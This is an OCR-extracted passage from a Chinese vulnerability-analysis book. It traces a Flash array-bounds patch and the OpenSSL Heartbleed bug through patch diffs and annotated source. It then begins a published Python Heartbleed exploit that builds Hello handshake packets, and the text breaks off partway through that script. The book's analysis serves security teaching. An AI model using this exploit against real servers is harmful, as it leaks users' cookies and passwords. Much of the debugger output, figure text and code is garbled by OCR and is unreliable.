图8-28搜索到的指令
笔者最初是在这条搜索到的指令及其所在函数入口处下断点，结果发现函数入口断下了，但搜
索到的这条指令未执行到，直接用IDAF5看了下，发现对数组索引值添加了判断，避免索引值过大
导致数组越界，如图8-29所示。
1f ( 6 = 7 11 (v8 = *[00
1e *)(a3 & BdFFFFFFF8), v8  4294947295.0 )
LABEL_12:
if ( t*(_000R0 *)ah )
gote LaetL_1h;
*_0401D *]aA
58b_183c48(a6, a5)1
as1e
le cc ce = xn
if ( v7 (a5 )
goto LRBEL_12;
(n *  + ge)(x
//对数组索引值加判断逻辑，避免数组越界索引
图8-29添加判断逻辑，避免数组越界素引
在调试器中对上述函数下断点：
0:002> 1m m Flash*
start
end
module name
61930eee 61f5ee00
Flash1et
(deferred)
0:002> ? 3F2380+6193000
---
## Page 401
382漏洞战争：软件漏洞分析精要
Evaluate express1on: 16411616e0 = 61d22380
0:062>bp61d22388
然后，单步跟踪到邻近数组索引的指令，可以看到其中的eax正是样本中设置的索引值，说明此
处确实是修复漏洞的相关代码，如图8-30所示。补丁程序添加了对参数数组索引值大小的判断，当
索引值大于传递的参数数组元素个数时（样本中未向test函数传递参数，因此这里是与0做比较），
就跳过数组元素索引，可以有效地防止数组越界访问。
3426093443410
idc
drord p
18b
本中说照的索
(0)
23
0040-s6
ptr [esp+38b]
1220+09999710 0200:99
-001b
判账姓组索引值大
0000202
tIDE1
cap
2.P
sax.ebp
925°
001b
Jae
图8-30修复漏润的关键代码
脏出血”）
8.4.1漏洞描述
2014年4月7日，OpenSSL官方发布了一项安全公告，称OpenSSL的HcartBeat心跳模块存在一处
严重漏洞，主要影响OpenSSL1.0.1~1.0.1f及OpenSSL1.0.2beta1测试版，利用漏洞可以造成服务器敏
感信息泄露（比如包含用户登录态的Cookie，甚至是账号密码），即轰动一时的“心脏出血”漏洞。
很快在网上就有人公布利用工具，并在乌云上出现不少攻击案例，危害范围也相当广，很多企业受
影响，外部媒体也在大肆炒作，整个互联网顿时血雨胆风。
---
## Page 402
第8章数组越界访问漏润分析383
8.4.2
基于源码对比与跟踪的漏洞分析方法
简短的数据包，以表示自己仍在线。正是这种周期性的请求操作，才将其形象地比喻为“心跳”。
由于OpenSSL是开源项目，因此可以从官网下载到源码，在RedHat的BUG列表中可以看到补丁
代码比对情况（https:/bugzilla.redhat.com/attachment.cgi?id=883475&action=diff），补丁主要修改了
d1_both.c和t1_lib.c文件中的duls1_process_heartbeat函数与tls1_process_heartbeat函数，从函数名可以看
出这两个函数是用于处理“心跳包”数据的。补丁的代码修改得不多，很容易看到如图8-31和图8-32
所示的关键代码，两个函数主要都是添加了对s->s3->rec.length的长度值判断。下面我们主要看下
tlsl_process_heartbeat函数的情况，另一个函数的情况跟它类似，此处不再详细分析。
t t μaq i8: /  6
60
watiged iat payboed/
31:  3H 3
09
655
图8-31补丁代码对比
2
g / 9t -
59
TLu_IT_
sxios, Tamr,
259E
加了对长度
SS__QLST)
图8-32修复代码中加强对长度的判断
---
## Page 403
384漏洞战争：软件漏洞分析精要
为了更进一步地了解length字段的用途及漏洞原理，我们从官网下载openssl-1.0.1f源码包做进一
步分析。先从s->s3->rec.length入手，s来源于传递给tsl_process_heartbeat的参数SSL*s，那么可以先
在源码中找到对SSL结构的定义，
笔者使用UtraEdit进行搜索，该工具支持子目录循环搜索，如果读者是Linux爱好者，那么用grep
与vim命令也可以实现同类功能。先用UItraEdit打开OPENSSL源码目录，然后单击“搜索”→“在文
055
,,,
  , m,
ertrl
mn r,8, ,e
三
图8-33搜索°typedef struct ssl”的结果
在openssl-1.0.1fcryptooss_typ.h文件中定义了SSL，它代表ssl_st结构：
typedef struct ss1_st SSL;
我们继续用UltraEdit搜索ssl_st结构的定义，按前面的方法搜索关键字“structssl_st”，搜索到如
下对ssl_st结构定义的位置：
C:\Users\Administrator\Desktop\openss1-1.0.1f\ss1\ss1.h(1114): struct ss1_st
双击打开该文件的1114行内容，然后搜索“s3”（补丁代码中s->s3->rrec.length的s3），发现其
指向ssl3_state_st结构：
struct ss1_st
---
## Page 404
第8章数组越界访问漏润分析385
/* protocol version
*(one of SSL2_VERSION, SSL3_VERSION, TLS1_VERSION, DTLS1_VERSION)
int version;
*/
int type; /* SSL_ST_CONNECT or SSL_ST_ACCEPT */
const SSL_METHOD *method; /* SSLv3 */
/* There are 2 BIo′s even though they are normally both the
* same.This is so data can be read and written to different
* handlers */
…省略部分内容
struct ss12_state_st *s2; /* SSLv2 variables */
struct ss13_state_st *s3;/* sSLv3 variables */
struct dt1s1_state_st *d1; /* DTLSv1 variables */
…省略部分内…
用关键词“struct ssl3_state_st”继续搜索ssl3_stat_st结构的定义代码：
typedef struct ss13_state_st
long flags;
int delay_buf_pop_ret;
…略部分内容
SSL3_BUFFER rbuf;
/*read IO goes into here */
SSL3_BUFFER wbuf;
/* write I0 goes into here */
SSL3_RECORD rrec;
/* each decoded record goes in here */
SSL3_RECORD wrec;
/* goes out fron here */
省略部分内容
按上述方法找到SSL3_RECORD结构的定义代码，它在openssl-1.0.1fssissl3.h中定义此结构：
C: \Users\Administrator\Desktop\openss1-1.0.1f\ss1\ss13.h(348) : typedef struct ss13_record_st
---
## Page 405
386漏洞战争：软件漏洞分析精要
对应的代码如下：
typedef struct ss13_record_st
（
/*r*/
int type;
/* type of record */
/*rw/
unsigned int length;
/* How many bytes available */
/*r/
unsigned int off;
/*read/write offset into ‘buf'*/
/*rw*/
unsigned char *data;
/*pointer to the record data */
/*n/
unsigned char *input;
/*
where the decode bytes are */
/*r */
unsigned char *conp;
/* only used with decompression - malloc()ed */
/*r/
unsigned long epoch;
/* epoch nunber, needed by DTLS1 */
/*r*/
unsigned char seq_nun[8]; /* sequence number, needed by DTLS1 */
}SSL3_RECORD;
到这里就可以确认，补丁代码中添加长度值判断，主要就是针对SSL3_RECORD中的length字段
进行检测，它代表着SSL3记录数据的有效长度值，该值可由外部用户控制。
回头看下openssl/ssl/t1_lib.c中tls1_process_heartbcat函数对上面长度值的处理情况。
int tls1_process_heartbeat(SSL *s)
unsigned char *p = &s->s3->rrec.data[e], *pl;
//p指向SSL3记录数据，即心跳包数据
unsigned short hbtype;
unsigned int payload;
unsigned int padding = 16; /* Use minimum padding */
/* Read type and payload length first */
hbtype = *p++;
//心跳包类型
n2s(p, payload);
//心跳包长度payload，n2s是将双字节转换成单字节
p1 = p;
//心跳包数据
If (s->msg_callback)
s->msg_callback(0, s->version, TLS1_RT_HEARTBEAT,
&s->s3->rrec.data[0], s->s3->rrec.length,
s, s->nsg_callback_arg);
if (hbtype == TLS1_HB_REQUEST)
//心跳请求包类型
unsigned char *buffer, *bp;
int r;
/* Allocate memory for the response, size is 1 bytes
* message type, plus 2 bytes payload length, plus
---
## Page 406
第8章数组越界访问漏润分析387
* payload, plus padding
*/
buffer = OPENSSL_malloc(1 + 2 + payload + padding);
//分配最大可为65554
（1+2+65535+16）的内存块
bp = buffer;
//bp指向上面分配的内存块
/* Enter response type, length and copy payload */
*bp++-TLS1_HB_RESPONSE;//第1字节填充响应类型
s2n(payload, bp);
//将长度值payload由单字节转换成双字节，然后填充到bp的
memcpy（bp，pl，payload）;//最后填充payload长度的pl数据（用户提供的心跳包数据），
面此处payload完全由用户控制，当传入过大数值时，可能导致越界访间pl之后的数据，若将读取的数据返
回给用户即可造成敏感信息泄露
bp += payload;
/* Random padding */
RAND_pseudo_bytes（bp，padding);//随机填充字节
//将前面复制进内存区域的数据写入SSL3_RECORD中，并返回给用户
r = ss13_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload + padding);
1f (r >= 0 && s->nsg_cal1back)
s->msg_cal1back(1, s->version, TLS1_RT_HEARTBEAT,
buffer, 3 + payload + padding,
s, s->msg_callback_arg);
OPENSSL_free(buffer) ;
//释放内存
if (r tlsext_hb_seq)
s->tlsext_hb_seq++;
{
---
## Page 407
388漏洞战争：软件漏洞分析精要
s->tlsext_hb_pending = θ;
return θ;
总结漏洞形成的过程及原因，其原理如图8-34所示。
（1）用户发送心跳包给服务端处理，OpenSSL会调用 dtls1_process_heartbeat 函数或者tls1_process
heartbeat函数对心跳包进行处理。
（2）心跳包处理函数会分配最大为65554（1+2+65535+16）的内存块，然后读取用户指定的payload
长度的内存数据到分配区域，由于复制长度payload是由用户控制的，当它超过心跳包数据的实
际长度时，会造成越界访问。
（3）心跳包处理函数会将类型、长度、数据组装成心跳的响应包返回给用户，如果前面越界访间的
内存包含敏感信息（如Cookie），就可能导致敏感信息泄露，直接导致账号被盗。
正常心器包处理流程
长度
B：Daca
儿
TSIH
异常心跳包处理流程
长度：
↑
长度
图8-34HeartBeat漏润原理图
---
## Page 408
第8章数组越界访问漏润分析389
8.4.3利用漏洞盗取网站账号
网上早已有利用工具公开，并且支持多个协议版本（SSL3.0、TLS1.0、TLS1.1、TLS1.2），
其通过发送Hello握手包，再发送包含过大Payload长度值的心跳请求包给服务端，最终越界访问到其
他可能包含敏感数据的内存区域。具体的利用代码及其注释如下：
import struct
import sys
import socket
import time
import select
import re
from optparse import OptionParser
options = OptionParser(usage=*%prog server [options]′, description=′Test for SSL heartbeat
vulnerabi1ity (CVE-2e14-e16e) )
options.add_option(*-p′, *--port', type=′int′, default=443, help=*TCP port to test (default:
（.(E
def h2bin(×):
（,xau.)aposap·(..*,u\.)aoerdau·(.,*..)asetdau*x uuna
支持多个协议版本
version = []
version.append([′SSL 3.e′,*e3 ee′])
version.append([*TLS 1.e′,′03 e1′])
（[.ze ee..tT S1.])puaddeuotsaA
（[,E0 E0.^,z'T S11.])puadde*uotsJaA
创建He11o握手包
def create_hello(version):
hello = h2bin(*16 * + version + * ee dc 01 ee ee d8 * + version + *"' 53
43 5b 9e 9d 9b 72 eb bc ec bc 2b 92 a8 48 97 cf
bd 39 84 cc 16 0a 85 83 90 9f 77 e4 33 d4 de ee
 00 S 89 66 00 66 69 2 80 20 89 a1 90 1 83
co @e ce e4 00 2f 00 96 e0 41 c0 11 c0 07 c0 c